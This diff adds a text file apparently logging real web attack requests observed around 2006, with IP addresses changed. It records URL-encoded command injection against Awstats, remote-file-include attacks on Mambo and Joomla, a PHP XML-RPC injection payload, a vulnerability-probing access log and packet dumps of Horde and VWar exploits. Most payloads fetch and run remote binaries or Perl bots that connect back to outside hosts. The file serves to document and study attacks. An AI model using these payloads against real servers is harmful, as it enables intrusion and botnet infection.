@@ -1,0 +1,134 @@
+These are some of the actual requests (with IP addresses changed) that
+have been observed. See the pdf file for more info -- jamesr@europe.com
+
+Awstats
+=======
+
+wget -O /tmp/test1.log "http://127.0.0.1/hiphop/doesntexist.php?configdir=cd%20/tmp;wget%20127.0.0.1/mirela;chmod%20744%20mirela"
+
+wget -O /tmp/test2.log "http://127.0.0.1/hiphop/doesntexist.php?configdir=%7cecho%20%3becho%20b_exp%3bwget%20http%3a%2f%2f192%2e168%2e26%2e26%2flibsh%2fping%2etxt%3bmv%20ping%2etxt%20temp2006%3bperl%20temp2006%20210%2e245%2e233%2e251%208080%3bwget%20http%3a%2f%2f192%2e168%2e26%2e26%2flibsh%2fping%3bchmod%20%2bx%20ping%3b%2e%2fping%20210%2e245%2e233%2e251%208080%3bcurl%20%2do%20ping%20http%3a%2f%2f192%2e168%2e26%2e26%2flibsh%2fping%3bchmod%20%2bx%20ping%3b%2e%2fping%20210%2e245%2e233%2e251%208080%3bcd%20%2ftmp%2f%3bcurl%20%2do%20temp2006%20http%3a%2f%2f192%2e168%2e26%2e26%2flibsh%2fping%2etxt%3bwhile%20%5b%201%20%5d%3bdo%20perl%20temp2006%20210%2e245%2e233%2e251%208080%3bdone%3bwget%20http%3a%2f%2f192%2e168%2e26%2e26%2flibsh%2fping%3bchmod%20%2bx%20ping%3b%2e%2fping%20210%2e245%2e233%2e251%208080%3bcurl%20%2do%20ping%20http%3a%2f%2f192%2e168%2e26%2e26%2flibsh%2fping%3bchmod%20%2bx%20ping%3b%2e%2fping%20210%2e245%2e233%2e251%208080%3becho%20e_exp%3b%2500"
+
+Various remote include issues
+=============================
+
+wget -O /tmp/test3.log "http://127.0.0.1/hiphop/doesntexist.php?include=http://www.members.example.uk/kaero/fbi.gif?&cmd=cd%20/tmp;curl%20-O%20www.members.example.uk/kaero/botperl;perl%20botperl"
+
+wget -O /tmp/test4.log "http://127.0.0.1/hiphop/doesntexist.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path="http://192.168.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20192.168.40.113/listen;chmod%20744%20listen;./listen;echo%20YYY;echo|"
+
+
+PHP XML RPC vulnerability
+=========================
+
+POST payload:
+
+<?xml version="1.0"?><methodCall><methodName>test.method</methodName><params><param><value><name>',''));echo '_begin_';echo\ `cd /tmp;wget 192.168.56.144/gicuji;chmod +x gicuji;./gicuji         `;echo '_end_';exit;/*</name></value></param></params>\</methodCall>
+
+POST to /xmlsrv/xmlrpc.php as follows:
+
+wget --post-file post-test http://127.0.0.1/xmlsrv/xmlrpc.php
+
+
+URLs attacked
+=============
+
+'wget' command injection attempts launched on the following:
+
+POST /blogs/xmlsrv/xmlrpc.php HTTP/1.1
+POST /blog/xmlrpc.php HTTP/1.1
+POST /blog/xmlsrv/xmlrpc.php HTTP/1.1
+POST /drupal/xmlrpc.php HTTP/1.1
+POST /phpgroupware/xmlrpc.php HTTP/1.1
+POST /wordpress/xmlrpc.php HTTP/1.1
+POST /xmlrpc.php HTTP/1.1
+POST /xmlrpc/xmlrpc.php HTTP/1.1
+POST /xmlsrv/xmlrpc.php HTTP/1.1
+
+GET /admin_styles.phpadmin_styles.php
+GET /articles/mambo/index2.php
+GET /awstats/awstats.pl
+GET /cache/index2.php
+GET /cgi-bin/awstats/awstats.pl
+GET /cgi-bin/awstats.pl
+GET /cvs/index2.php
+GET /cvs/mambo/index2.php
+GET /Forums/admin/admin_styles.php
+GET /Forums/admin/admin_styles.phpadmin_styles.php
+GET /index2.php
+GET /index.php
+GET /mambo/index2.php
+GET /modules/coppermine/themes/default/theme.php
+GET /modules/coppermine/themes/default/theme.phptheme.php
+GET /modules/Forums/admin/admin_styles.php
+GET /modules/Forums/admin/admin_styles.phpadmin_styles.php
+GET /php/mambo/index2.php
+
+Someone probing:
+================
+
+192.168.65.181 - - [03/Apr/2006:13:52:39 +1200] "GET /thisdoesnotexistahaha.php HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:52:40 +1200] "GET /modules/newbb_plus/class/forumpollrenderer.php HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:52:40 +1200] "GET /WebCalendar/tools/send_reminders.php HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:52:41 +1200] "GET /webcalendar/tools/send_reminders.php HTTP/1.1" 200
+192.168.65.181 - - [03/Apr/2006:13:52:42 +1200] "GET /cal/tools/send_reminders.php HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:52:42 +1200] "GET /Calendar/tools/send_reminders.php HTTP/1.1" 404 
+192.168.65.181 - - [03/Apr/2006:13:52:43 +1200] "GET /calendar/tools/send_reminders.php HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:52:44 +1200] "GET /protection.php HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:52:45 +1200] "GET /modules/AllMyGuests/signin.php HTTP/1.1" 404 
+192.168.65.181 - - [03/Apr/2006:13:52:46 +1200] "GET /classes.php HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:52:49 +1200] "GET /modules/newbb_plus/class/forumpollrenderer.php HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:52:50 +1200] "GET /mambo/index2.php?option=com_content&do_pdf=1&id=1 HTTP/1.1" 200
+192.168.65.181 - - [03/Apr/2006:13:52:51 +1200] "GET /mambo/index.php?option=com_content&do_pdf=1&id=1 HTTP/1.1" 200
+192.168.65.181 - - [03/Apr/2006:13:52:52 +1200] "GET /index2.php?option=com_content&do_pdf=1&id=1 HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:52:52 +1200] "GET /index.php?option=com_content&do_pdf=1&id=1 HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:53:07 +1200] "GET /cgi-bin/awstats.pl HTTP/1.1" 200
+192.168.65.181 - - [03/Apr/2006:13:53:07 +1200] "GET /scgi-bin/awstats.pl HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:53:11 +1200] "GET /cgi-bin/awstats/awstats.pl HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:53:11 +1200] "GET /scgi-bin/awstats/awstats.pl HTTP/1.1" 404 304 "-" "Mozilla/4.0
+192.168.65.181 - - [03/Apr/2006:13:53:15 +1200] "GET /scgi/awstats/awstats.pl HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:53:15 +1200] "GET /scripts/awstats.pl HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:53:16 +1200] "GET /cgi-bin/awstats/awstats.pl HTTP/1.1" 404 
+192.168.65.181 - - [03/Apr/2006:13:53:20 +1200] "GET /cgi-bin/stats/awstats.pl HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:53:20 +1200] "GET /scgi-bin/stats/awstats.pl HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:53:21 +1200] "GET /stats/awstats.pl HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:53:21 +1200] "GET /blog/xmlrpc.php HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:53:25 +1200] "GET /blogs/xmlsrv/xmlrpc.php HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:53:26 +1200] "GET /drupal/xmlrpc.php HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:53:27 +1200] "GET /phpgroupware/xmlrpc.php HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:53:28 +1200] "GET /wordpress/xmlrpc.php HTTP/1.1" 404 
+192.168.65.181 - - [03/Apr/2006:13:53:29 +1200] "GET /xmlrpc.php HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:53:29 +1200] "GET /xmlrpc/xmlrpc.php HTTP/1.1" 200
+192.168.65.181 - - [03/Apr/2006:13:53:31 +1200] "GET /xmlsrv/xmlrpc.php HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:53:31 +1200] "GET /services/xmlrpc.php HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:53:32 +1200] "GET /html/xmlrpc.php HTTP/1.1" 404
+192.168.65.181 - - [03/Apr/2006:13:53:32 +1200] "GET  HTTP/1.1" 400 - "-" "-" "-"
+
+Horde & VWar vulnerabilities
+
+http://isc.sans.org/diary.php?storyid=1262 
+
+02:38:43.817967 IP compromised.com.1044 > www.example.com.www: P
+0:412(412) ack 1 win 65535
+        0x0000:  4500 01c4 a2ac 4000 7106 5012 0ca2 a1a1  E.....@.q.P.....
+        0x0010:  48e8 1e4a 0414 0050 ec05 5522 9e0c 2a9d  H..J...P..U"..*.
+        0x0020:  5018 ffff 3431 0000 4745 5420 6874 7470  P...41..GET.http
+        0x0030:  3a2f 2fxx xx2e yyyy yy2e 3330 2e37 342f  ://xx.yyy.30.74/
+        0x0040:  7677 6172 2f69 6e63 6c75 6465 732f 6765  vwar/includes/ge
+        0x0050:  745f 6865 6164 6572 2e70 6870 3f76 7761  t_header.php?vwa
+        0x0060:  725f 726f 6f74 3d68 7474 703a 2f2f 7870  r_root=http://xp
+        0x0070:  6c2e 6e65 746d 6973 7068 6572 6532 2e63  l.netmisphere2.c
+        0x0080:  6f6d 2f43 4d44 2e67 6966 3f26 636d 643d  om/CMD.gif?&cmd=
+        0x0090:  7767 6574 2048 5454 502f 312e 300d 0a48  wget.HTTP/1.0.
+
+02:38:43.841958 IP compromised.com.1047 > www.example.com.www: P
+1205950111:1205950537(426) ack 2648749032 win 65535
+        0x0000:  4500 01d2 a2b9 4000 7206 4ef7 0ca2 a1a1  E.....@.r.N.....
+        0x0010:  48e8 1e4a 0417 0050 47e1 569f 9de0 b3e8  H..J...PG.V.....
+        0x0020:  5018 ffff 1fd8 0000 4745 5420 6874 7470  P.......GET.http
+        0x0030:  3a2f 2fxx xx2e yyyy yy2e 3330 2e37 342f  ://xx.yyy.30.74/
+        0x0040:  7765 626d 6169 6c2f 686f 7264 652f 7365  webmail/horde/se
+        0x0050:  7276 6963 6573 2f68 656c 702f 3f73 686f  rvices/help/?sho
+        0x0060:  773d 6162 6f75 7426 6d6f 6475 6c65 3d3b  w=about&module=;
+        0x0070:  2532 322e 7061 7373 7468 7275 2825 3232  %22.passthru(%22
+        0x0080:  6563 686f 2532 3049 524f 434b 5448 4557  echo%20IROCKTHEW
+        0x0090:  4f52 4c44 2532 3229 3b27 2e20 4854 5450  ORLD%22);'..HTTP
+        0x00a0:  2f31 2e30 0d0a 486f 7374 3a20 3732 2e32  /1.0..
